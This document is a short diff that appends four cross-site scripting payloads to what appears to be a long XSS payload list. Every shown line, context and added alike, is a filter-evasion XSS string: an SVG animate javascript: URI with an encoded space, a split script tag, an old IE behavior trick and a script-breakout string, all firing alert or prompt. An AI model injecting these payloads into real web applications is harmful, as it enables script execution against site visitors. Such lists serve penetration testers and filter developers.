@@ -1694,3 +1694,7 @@ GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;
 <img src='x'alt='con'lang='firm'onerror=top[alt+lang](document.domain)>
 %3C%2Ftitle%3E%3Cscript%20src%3D%22data:&q=jav%26%23x76;s%26%23x76;ript%26colon;a%26%23x5c;u006Cert(1)%22%3E
 <% style=behavior:url(: onreadystatechange=alert(1)>
+<scronerror=ipt>prompt(document.domain)</scronerror=ipt>
+<svg><animate href=#x attributeName=href values="&#x3000;javascript:alert(7)"/><a id=x><circle r=100>
+<% style=behavior:url(: onreadystatechange=alert(1)>
+</script><svg>"-alert(3)//
